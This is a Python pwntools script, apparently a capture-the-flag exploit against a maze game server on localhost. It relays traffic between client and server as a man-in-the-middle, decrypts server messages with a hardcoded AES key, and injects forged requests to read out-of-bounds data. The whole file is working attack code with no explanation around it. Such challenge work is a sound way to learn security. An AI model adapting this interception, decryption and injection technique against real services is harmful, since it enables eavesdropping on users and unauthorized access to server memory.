#!/usr/bin/env python3

from pwn import *
from Crypto.Cipher import AES

server = remote('localhost', '31337')
client = listen(1337)

def decrypt_message(m):
    key = b'sUp3r_S3cuR3_keY'
    iv = m[:16]
    ctxt = m[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(ctxt)

def eavesdrop_message(from_host, to_host):
    # Get expected number of bytes
    from_host_bytes = from_host.recvn(8)
    to_host.send(from_host_bytes)
    expected_bytes = int(from_host_bytes[1:-1].decode())
    # Get actual message
    from_host_bytes = from_host.recvn(expected_bytes)
    to_host.send(from_host_bytes)
    return from_host_bytes

def inject_message(host, msg_type, message):
    host.send(f'{msg_type}{len(message):06d} '.encode())
    host.send(message)

# handshake, then receive maze
for i in range(2):
    print('client:', eavesdrop_message(client, server))
    print('server:', eavesdrop_message(server, client))

# messages
while (input().strip() == ''):
    print('client:', eavesdrop_message(client, server))
    print('server:', decrypt_message(eavesdrop_message(server, client)).strip(b'\x00'))

# read first out of bounds thing
while True:
    inject_message(server, 'd', b'9,9,10')
    print('server:', decrypt_message(eavesdrop_message(server, client)).strip(b'\x00'))
    inject_message(server, 'd', b'9,9,10')
    print('server:', decrypt_message(eavesdrop_message(server, client)).strip(b'\x00'))
    inject_message(server, 'd', b'9,9,10')
    print('server:', decrypt_message(eavesdrop_message(server, client)).strip(b'\x00'))
    inject_message(server, 'd', b'9,9,10')
    print('server:', decrypt_message(eavesdrop_message(server, client)).strip(b'\x00'))
    input()


